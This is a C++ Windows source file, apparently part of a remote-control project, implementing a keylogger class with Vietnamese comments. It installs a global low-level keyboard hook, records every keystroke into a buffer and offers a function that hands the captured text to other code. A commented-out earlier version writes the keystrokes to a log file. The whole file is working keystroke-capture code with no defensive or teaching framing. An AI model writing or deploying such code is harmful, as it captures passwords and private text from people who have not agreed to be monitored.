#include "KeyboardController.h"
#ifdef _WIN32

// HHOOK Keylogger::_hook = NULL;

// void Keylogger::logKeystroke(int key) {
//     ofstream logfile;
//     logfile.open("keylog.txt", ios::app);

//     if (key == VK_BACK)
//         logfile << "[BACKSPACE]";
//     else if (key == VK_RETURN)
//         logfile << "[ENTER]";
//     else if (key == VK_SPACE)
//         logfile << " ";
//     else if (key == VK_TAB)
//         logfile << "[TAB]";
//     else if (key == VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT)
//         logfile << "[SHIFT]";
//     else if (key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL)
//         logfile << "[CTRL]";
//     else if (key == VK_ESCAPE)
//         logfile << "[ESC]";
//     else if (key == VK_OEM_PERIOD)
//         logfile << ".";
//     // Log alphabetic keys (A-Z) and numbers (0-9) as the character itself.
//     else if (key >= 'A' && key <= 'Z')
//         logfile << char(key); // Log the uppercase letter pressed.
//     else if (key >= '0' && key <= '9')
//         logfile << char(key); // Log the number pressed.

//     else 
//         logfile << "[" << key << "]"; // Log other keys using their virtual keycode. 
//     logfile.close();
// }

// LRESULT CALLBACK Keylogger::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    
//     if (nCode >= 0 && wParam == WM_KEYDOWN) {
//         KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT*)lParam;
//         int key = pKeyBoard->vkCode;
        
//         if (key == VK_F12) {
//             PostQuitMessage(0);
//             return CallNextHookEx(_hook, nCode, wParam, lParam);
//         }

//         logKeystroke(key);
//     }
    
//     return CallNextHookEx(NULL, nCode, wParam, lParam);
// }

// void Keylogger::Solve() {
//     HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);

//     MSG msg;

//     while (GetMessage(&msg, NULL, 0, 0)) {
//         TranslateMessage(&msg);
//         DispatchMessage(&msg);
//     }

//     UnhookWindowsHookEx(keyboardHook);

// }


// Khởi tạo các biến static
HHOOK Keylogger::_hook = NULL;
std::string Keylogger::_buffer = "";
std::mutex Keylogger::_mtx;

Keylogger::Keylogger() : _isRunning(false) {}

Keylogger::~Keylogger() {
    Stop(); // Đảm bảo dừng thread khi hủy class
}

// --- PHẦN 1: Logic xử lý chuỗi ---
void Keylogger::append(const std::string& str) {
    // Thread-safe buffer access
    std::lock_guard<std::mutex> lock(_mtx); 
    _buffer += str;
}

// --- PHẦN 2: Hàm xử lý phím (Hook Procedure) ---
LRESULT CALLBACK Keylogger::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    // Process valid keydown events only
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
        int key = kbdStruct->vkCode; // Lấy mã phím ảo

        // Xử lý các phím đặc biệt để dễ đọc
        if (key == VK_BACK) append("[BACK]");
        else if (key == VK_RETURN) append("\n");
        else if (key == VK_SPACE) append(" ");
        else if (key == VK_TAB) append("[TAB]");
        else if (key == VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT) {}
        else if (key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL) append("[CTRL]");
        else if (key == VK_ESCAPE) append("[ESC]");
        // Xử lý số và chữ cái
        else if ((key >= '0' && key <= '9') || (key >= 'A' && key <= 'Z')) {
             // Chuyển mã ASCII sang ký tự
             append(std::string(1, (char)key));
        }
        else {
             // Các phím lạ thì ghi mã số
             append("[" + std::to_string(key) + "]");
        }
    }
    // Forward event to next hook (required for keyboard to work)
    return CallNextHookEx(_hook, nCode, wParam, lParam);
}

// --- PHẦN 3: Quản lý luồng (Threading) ---
void Keylogger::Start() {
    if (_isRunning) return;
    _isRunning = true;

    // Tạo luồng riêng để lắng nghe
    _workerThread = std::thread([this]() {
        // Cài đặt Hook
        _hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);

        // Vòng lặp tin nhắn (Message Loop)
        // Bắt buộc phải có để Hook hoạt động trên Windows
        MSG msg;
        while (_isRunning && GetMessage(&msg, NULL, 0, 0)) {
            if (msg.message == WM_QUIT) break; // Nhận lệnh thoát thì dừng
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }

        // Dọn dẹp hook khi vòng lặp kết thúc
        if (_hook) {
            UnhookWindowsHookEx(_hook);
            _hook = NULL;
        }
    });
}

void Keylogger::Stop() {
    if (!_isRunning) return;
    _isRunning = false;

    // Gửi tin nhắn WM_QUIT vào luồng worker để đánh thức GetMessage và thoát vòng lặp
    if (_workerThread.joinable()) {
        PostThreadMessage(GetThreadId(_workerThread.native_handle()), WM_QUIT, 0, 0);
        _workerThread.join();
    }
}

// --- PHẦN 4: Lấy dữ liệu an toàn ---
std::string Keylogger::getDataAndClear() {
    std::lock_guard<std::mutex> lock(_mtx); // Khóa lại!
    
    if (_buffer.empty()) return "";
    
    std::string dataCopy = _buffer; // Copy dữ liệu ra
    _buffer.clear();                // Xóa dữ liệu gốc đi
    
    return dataCopy; // Trả về bản copy
} // Tự động mở khóa
#endif